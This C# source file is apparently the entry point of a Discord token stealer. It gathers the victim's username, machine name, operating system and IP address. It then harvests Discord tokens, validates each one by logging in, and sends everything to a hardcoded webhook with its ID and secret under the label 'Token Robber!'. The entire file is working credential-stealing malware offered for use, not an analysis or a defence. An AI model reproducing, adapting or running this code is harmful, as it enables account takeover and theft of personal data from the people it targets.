using System.Collections.Concurrent;
using Cysharp.Text;
using DiscordTokenStealer;
using DiscordTokenStealer.Discord;

using var content = ZString.CreateUtf8StringBuilder();
content.AppendLine($"Username: {Environment.UserName}");
content.AppendLine($"Machine Name: {Environment.MachineName}");
content.AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})");
content.AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}");
content.AppendLine("Token(s): ");

var semaphore = new SemaphoreSlim(1, 1);
var loggedUsers = new ConcurrentBag<string>();

using (var discordClient = new DiscordClient())
{
    await foreach (var token in TokenParser.ParseAsync())
    {
        await semaphore.WaitAsync();
        try
        {
            if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id)) 
                continue;
            content.Append(discordUser);
            loggedUsers.Add(discordUser.Id);
        }
        finally
        {
            semaphore.Release();
        }
    }
}

using var webhook = new DiscordWebhookClient("947227745136570409", "W-f1csQP6qyaHN9M4imQegmqaEe3hT-a0Bd508TCSvdpgMblpmXyU8vlVUfQpfiBL_2S");
await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
